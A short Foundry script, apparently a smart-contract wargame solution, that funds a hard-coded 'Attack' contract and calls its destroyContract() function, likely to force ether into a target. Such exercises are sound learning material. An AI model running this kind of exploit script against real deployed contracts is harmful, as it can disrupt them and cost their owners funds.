// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

// Attack contract address: "0xab60fAF196f2CC1CF8001D1D1476ff0D4149Fe7c"

interface IAttack {
    function destroyContract() external;
}

contract TriggerAttack is Script {
    IAttack public attack;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);
        attack = IAttack(0xab60fAF196f2CC1CF8001D1D1476ff0D4149Fe7c);
        vm.stopBroadcast();

        vm.startBroadcast(privateKey);
        (bool success, ) = address(attack).call{value: 0.00001 ether}("");
        if (!success) {
            revert("Transaction failed!");
        }
        attack.destroyContract();
        vm.stopBroadcast();
    }
}
